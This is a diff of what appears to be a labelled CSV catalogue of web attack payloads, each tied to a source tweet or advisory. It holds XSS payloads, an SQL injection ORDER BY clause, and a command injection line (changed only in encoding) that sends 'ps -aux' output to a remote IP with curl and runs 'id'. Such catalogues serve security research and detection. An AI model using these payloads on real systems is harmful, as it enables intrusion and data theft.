@@ -486,6 +486,6 @@ https://github.com/crater-invoice/crater/issues/1267,%7B%22name%22%3A%22test.php
 https://twitter.com/g1nk00/status/1735407588529913969,&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;,xss
 https://twitter.com/TheMsterDoctor1/status/1743187595163501005,&lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x&gt;,xss
 https://vulners.com/github/GHSA-H374-MM57-879C?utm_source=rss&utm_medium=rss&utm_campaign=rss,(CASE+WHEN+(SELECT+1)=1+THEN+id+ELSE+updated_at+END)+ASC+,sqli
-https://vulners.com/cve/CVE-2023-50094?utm_source=rss&utm_medium=rss&utm_campaign=rss,'curl%20-X%20POST%20--data%20"$(ps%20-aux)"%20192.168.1.91/?`id`',rce
+https://vulners.com/cve/CVE-2023-50094?utm_source=rss&utm_medium=rss&utm_campaign=rss,curl%2520-X%2520POST%2520--data%2520%22%24%28ps%2520-aux%29%22%2520192.168.1.91%2F%3F%60id%60,rce
 https://twitter.com/g1nk00/status/1735407588529913969,"&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;",xss
 https://twitter.com/TheMsterDoctor1/status/1743187595163501005,"&lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x&gt;",xss
